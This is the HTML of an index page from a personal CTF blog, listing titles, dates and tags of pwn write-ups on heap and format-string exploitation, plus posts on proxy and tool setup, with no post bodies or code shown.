<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="theme-color" content="#1f2128">
<title>Orrr</title>
<link rel="shortcut icon" href="/favicon.ico?v=1726127756933">
<link rel="stylesheet" href="/media/css/mist.css">
<link rel="stylesheet" href="/media/fonts/font-awesome.css">
<link
  href="//fonts.loli.net/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext"
  rel="stylesheet" type="text/css">

<link href="/media/hljs/styles/tomorrow-night.css"
  rel="stylesheet">

<link rel="stylesheet" href="/styles/main.css">
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script src="/media/js/jquery.js"></script>
<script src="/media/hljs/highlight.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"
  integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">


<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"
  integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"
  integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
  onload="renderMathInElement(document.body);"></script>






</head>

<body>
  <div class="head-top-line"></div>
  <div class="header-box">
    
<div class="mist">
  <header class="header bg-color ">
    <div class="blog-header box-shadow-wrapper  " id="header">
      <div class="nav-toggle" id="nav_toggle">
        <div class="toggle-box">
          <div class="line line-top"></div>
          <div class="line line-center"></div>
          <div class="line line-bottom"></div>
        </div>
      </div>
      <div class="site-meta">       
        <div class="site-title">
          
            <a href="/" class="">
              <span class="logo-line-before">
                <i class=""></i>
              </span>
              <span class="main-title">Orrr</span>
              <span class="logo-line-after">
                <i class=""></i>
              </span>
            </a>  
          
        </div>
        
      </div>
      <nav class="site-nav" id="site_nav">
        <ul id="nav_ul">
          
            
            
              
            
            <li class="nav-item nav-item-active">
              
              
                <a href="/" target="_self">
                  <i class="fa fa-globe"></i> é¦–é¡µ
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="/archives" target="_self">
                  <i class="fa fa-globe"></i> å½’æ¡£
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/tags" target="_self">
                  <i class="fa fa-tags"></i> æ ‡ç­¾
                </a>
              
            </li>
          
            
            
              
            
            <li class="nav-item ">
              
              
                <a href="https://oraclepi.tech/post/about" target="_self">
                  <i class="fa fa-user"></i> å…³äº
                </a>
              
            </li>
          
          
            
              <li class="nav-item ">
                <a href="/friends/" target="_self">
                  
                    <i class="fa fa-address-book"></i> å‹é“¾
                  
                </a>
              </li>
            
          
          
            <li id="fa_search" class="nav-item">
              <a href="javascript:void(0);">
                <i class="fa fa-search"></i> <span class="language" data-lan="search">æœç´¢</span>
              </a>
            </li>
          
        </ul>
      </nav>
    </div>
  </header>
</div>

<script type="text/javascript"> 
 
  let showNav = true;

  let navToggle = document.querySelector('#nav_toggle'),
  siteNav = document.querySelector('#site_nav');
  
  function navClick() {
    let sideBar = document.querySelector('.sidebar');
    let navUl = document.querySelector('#nav_ul');
    navToggle.classList.toggle('nav-toggle-active');
    siteNav.classList.toggle('nav-menu-active');
    if (siteNav.classList.contains('nav-menu-active')) {
      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
    } else {
      siteNav.style = "";
    }
  }

  navToggle.addEventListener('click',navClick);  
</script>
  </div>
  <div class="main-continer">
    
    <div
      class="section-layout mist bg-color">
      <div class="section-layout-wrapper">
        <div id="sidebarMeta" class="sidebar">
    
<div class="sidebar-wrapper box-shadow-wrapper ">
  <div class="sidebar-item">
    <img class="site-author-image right-motion" src="/images/avatar.png"/>
    <p class="site-author-name">WIN_250</p>
    
  </div>
  <div class="sidebar-item side-item-stat right-motion">
    <div class="sidebar-item-box">
      <a href="/archives/">
        
        <span class="site-item-stat-count">99</span>
        <span class="site-item-stat-name language" data-lan="article">æ–‡ç« </span>
      </a>
    </div>
    <div class="sidebar-item-box">
      <a href="/tags/">
        <span class="site-item-stat-count">91</span>
        <span class="site-item-stat-name language" data-lan="tag">æ ‡ç­¾</span>
      </a>
    </div>
  </div>
  
  



</div>
</div>
<script>
  let sidebarMeta = document.querySelector('#sidebarMeta');
  let scheme = 'mist';
  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
    document.addEventListener('scroll', function(e) {
      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
        sidebarWrapper.classList.add('home-sidebar-fixed')
      } else {
        sidebarWrapper.classList.remove('home-sidebar-fixed')
      }
    });
  }
  </script>
        <div class="section-box mist">
          <section class="section bg-color posts-expand slide-down-in">
            
  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/nQxaOOZy1/"> NSSCTF Round#14 Basic. éƒ¨åˆ†wp </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-31 22:40:25">2023-07-31</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/TujU607Re/"> <span>æ–‡ä»¶æè¿°ç¬¦</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/DdN0h9Go8D/"> <span>fmtstr</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/QiZ26_NNz/"> <span>orw</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/yb4oKRkr2/">
        <span>æ ˆè¿ç§»</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >6<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >919<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/nQxaOOZy1/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/XKnqVgyRN1/"> éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸² ä¾‹é¢˜ </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-30 00:01:49">2023-07-30</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/7IUWN8nti/"> <span>éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/7tXUXE4_V/"> <span>PWN</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/TGwvl5QZZx/">
        <span>CTF</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >11<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >1809<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/XKnqVgyRN1/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/zoxorWZV-/"> AWDè®°å½• </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-28 15:50:08">2023-07-28</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/whlasyhk2/">
        <span>awd</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >1<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >179<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/zoxorWZV-/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/6yuwf6aET/"> [CISCN 2022 åˆèµ›]newest_note wp </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-26 18:41:21">2023-07-26</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/WhIxVHgjF/"> <span>exit_hook</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/-lpZIJeNJX/"> <span>æ•´å‹æº¢å‡º</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/bdxLJGuuMq/"> <span>double free</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/sF0wgZcXh/">
        <span>tcachebin attack</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >3<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >506<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/6yuwf6aET/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/4UNuWjKnk/"> ä¸€é“æˆ‘ä¹Ÿä¸çŸ¥é“åå­—çš„å †é¢˜å¤ç° </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-24 02:11:59">2023-07-24</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/SP-w7rwQ5/"> <span>æŒ‡é’ˆ</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/-lpZIJeNJX/"> <span>æ•´å‹æº¢å‡º</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/sF0wgZcXh/">
        <span>tcachebin attack</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >4<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >681<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/4UNuWjKnk/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/LMCf1vtkj/"> Ubuntuè™šæ‹Ÿæœºèµ°hostçš„clashä»£ç† </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-19 18:39:41">2023-07-19</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/N7YipDlRL/">
        <span>proxy</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >1<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >139<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/LMCf1vtkj/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/cbkv3xavp/"> mipsropé…ç½® </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-14 21:47:46">2023-07-14</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >1<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >98<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/cbkv3xavp/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/JYkjVlphv/"> [å·…å³°æå®¢ 2022]happy note wp </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-13 01:07:22">2023-07-13</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/7Bd3FG2b1/"> <span>house of apple</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/sF0wgZcXh/"> <span>tcachebin attack</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/LEbgNjrAAC/">
        <span>chunk overlapping</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >6<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >861<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/JYkjVlphv/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/apppplllllllleeeeeee/"> Hgame week4 å¤ç° </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-07-11 01:21:42">2023-07-11</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/7Bd3FG2b1/"> <span>house of apple</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/0dNLzeLRO/"> <span>_IO_FILE</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/BlopmajgiJ/">
        <span>largebin attack</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >6<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >999<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/apppplllllllleeeeeee/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>

  <article class="post-list-box  post box-shadow-wrapper">
    <div class="article-wrapper bg-color">
      <section class="post-header">
  <h1 class="post-title">
    <a class="post-title-link" href="https://oraclepi.tech/post/DLuwxEhs1/"> [å·…å³°æå®¢ 2022]Gift wp </a>
  </h1>
  <div class="post-meta">
    
    <span class="meta-item pc-show">
      <i class="fa fa-calendar-o"></i>
      <span class="language" data-lan="publish">å‘å¸ƒäº</span>
      <span class="publish-time" data-t="2023-06-27 18:45:15">2023-06-27</span>
      <span class="post-meta-divider pc-show">|</span>
    </span>
    
    <span class="meta-item">
      <i class="fa fa-folder-o"></i>
      <span class="pc-show language" data-lan="category-in">æ ‡ç­¾:</span>
       
      <a href="https://oraclepi.tech/tag/yEINjbuV-/"> <span>å †é£æ°´</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/sF0wgZcXh/"> <span>tcachebin attack</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/7tXUXE4_V/"> <span>PWN</span> </a>ã€   
      <a href="https://oraclepi.tech/tag/TGwvl5QZZx/">
        <span>CTF</span>
      </a>
       
    </span>
    <span class="post-meta-divider">|</span>
    
    <span class="meta-item">
      <i class="fa fa-clock-o"></i>
      <span
        >3<span class="language" data-lan="minute"
          >åˆ†é’Ÿ</span
        ></span
      >
    </span>
    <span class="meta-item">
      <span class="post-meta-divider">|</span>
      <i class="fa fa-file-word-o"></i>
      <span
        >415<span class="pc-show language" data-lan="words"
          >å­—æ•°</span
        ></span
      >
    </span>
    
  </div>
</section>

      <div class="post-body">
        
        
          
        
        
        <div class="post-button text-center">
          <a class="btn language" data-lan="read-more" href="https://oraclepi.tech/post/DLuwxEhs1/" rel="contents">
            é˜…è¯»å…¨æ–‡ Â»
          </a>
        </div>
        
      </div>
      
        <footer class="post-footer">
          <div class="post-eof"></div>
        </footer>
      
    </div>
  </article>
  
            
            
<div class="page bg-color">
  <ul class="pagination-ul">
    
      <li class="pagination-dir">
        <a href="https://oraclepi.tech/page/2/">
          <i class="fa fa-angle-left"></i>
        </a>
      </li>
    
    
      <!-- 1 2 3 4 ... N -->
      
        
          
            <li class="pagination-li ">
              <a href="/">1</a>
            </li>
          
        
          
            <li class="pagination-li ">
              <a href="/page/2">
                2
              </a>
            </li>
          
        
          
            <li class="pagination-li pagination-active">
              <a href="/page/3">
                3
              </a>
            </li>
          
        
          
            <li class="pagination-li ">
              <a href="/page/4">
                4
              </a>
            </li>
          
        
        <li class="pagination-li">
          â€¦
        </li>
        <li class="pagination-li">
          <a href="/page/10">
            10
          </a>
        </li>
      
    
    
      <li class="pagination-dir">
        <a href="/page/4">
          <i class="fa fa-angle-right"></i>
        </a>
      </li>
    
  </ul>
</div>
          </section>
        </div>
      </div>
    </div>
    <div class="footer-box">
  <footer class="footer">
    <center id="runTimeBox">
      å·²è¿è¡Œ:<span id="run_time"></span>
    </center>
    <span id="busuanzi_container_site_pv">æµè§ˆæ•°:<span id="busuanzi_value_site_pv"></span></span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">è®¿å®¢æ•°:<span id="busuanzi_value_site_uv"></span></span>

    <script>
      BirthDay = new Date('');
      if (BirthDay.getTime()) {
        function runTime() {
          str = "";
          today = new Date();
          timeold = today.getTime() - BirthDay.getTime();
          msPerDay = 24 * 60 * 60 * 1000;
          e_daysold = timeold / msPerDay;
          daysold = Math.floor(e_daysold);
          str += daysold + "å¤©";
          return str;
        }
        setInterval(function () {
          $("#run_time").html(runTime());
        }, 1000);
      } else {
        document.querySelector('.footer').removeChild(document.querySelector('#runTimeBox'));
      }
    </script>
    <div class="poweredby">
      ğŸ’¤ğŸ’¤ğŸ’¤
    </div>
  </footer>
  
    
      <div class="drawer-box right" id="drawer_box">
        <span class="muse-line muse-line-first"></span>
        <span class="muse-line muse-line-middle"></span>
        <span class="muse-line muse-line-last"></span>
      </div>
      
        <div class="mist back-to-top" id="back_to_top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
        
                  
                        
</div>
<script>
  let sideBarOpen = "sidebar-open";
  let body = document.body;
  let back2Top = document.querySelector("#back_to_top"),
    back2TopText = document.querySelector("#back_to_top_text"),
    drawerBox = document.querySelector("#drawer_box"),
    rightSideBar = document.querySelector(".sidebar"),
    viewport = document.querySelector("body");

  function scrollAnimation(currentY, targetY) {
    let needScrollTop = targetY - currentY;
    let _currentY = currentY;
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10);
      _currentY += dist;
      window.scrollTo(_currentY, currentY);
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY);
      } else {
        window.scrollTo(_currentY, targetY);
      }
    }, 1);
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener("scroll", function (e) {
    let percent =
      (document.scrollingElement.scrollTop /
        (document.scrollingElement.scrollHeight -
          document.scrollingElement.clientHeight)) *
      100;
    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
      back2Top.classList.add("back-top-active");
    }
    if (percent == 0) {
      back2Top.classList.remove("back-top-active");
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  let hasCacu = false;
  window.addEventListener("resize", function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // åŠ¨æ€è°ƒæ•´ç«™ç‚¹æ¦‚è§ˆé«˜åº¦
    if (
      (!hasCacu && back2Top.classList.contains("pisces")) ||
      back2Top.classList.contains("gemini")
    ) {
      let sideBar = document.querySelector(".sidebar");
      let navUl = document.querySelector("#site_nav");
      sideBar.style =
        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false,
    MOTION_TIME = 300,
    RIGHT_MOVE_DIS = "320px";

  if (drawerBox) {
    let rightMotions = document.querySelectorAll(".right-motion");
    let right = drawerBox.classList.contains("right");

    let transitionDir = right
      ? "transition.slideRightIn"
      : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingRight: "0px",
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingLeft: "0px",
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, "stop");
      jQuery.Velocity(viewport, "stop");
      jQuery.Velocity(rightMotions, "stop");
      if (open) {
        jQuery.Velocity(
          rightSideBar,
          {
            width: RIGHT_MOVE_DIS,
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, transitionDir, {});
            },
          }
        );
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME,
        });
      } else {
        jQuery.Velocity(
          rightSideBar,
          {
            width: "0px",
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, {
                opacity: 0,
              });
            },
          }
        );
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME,
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle("muse-line");
      }
      drawerBox.classList.toggle(sideBarOpen);
    };
  }

  // é“¾æ¥è·³è½¬
  let newWindow = "true";
  if (newWindow === "true") {
    let links = document.querySelectorAll(".post-body a");
    links.forEach((item) => {
      if (!item.classList.contains("btn")) {
        item.setAttribute("target", "_blank");
      }
    });
  }

  let faSearch = document.querySelector("#fa_search");
  faSearch &&
    faSearch.addEventListener("click", function () {
      document.querySelector("#search_mask").style = "";
    });

  // ä»£ç é«˜äº®
  hljs.initHighlightingOnLoad();

  // ç¦»å¼€å½“å‰é¡µtitleå˜åŒ–
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState == "hidden") {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }
</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll(".section img");
  images.forEach((image) => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement("a");
    aelem.href = image.src;
    aelem.dataset["fancybox"] = "images";
    aelem.dataset["rel"] = "fancybox-button";
    aelem.classList.add("fancybox");
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  });
</script>
  </div>
</body>

  <div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="æœç´¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
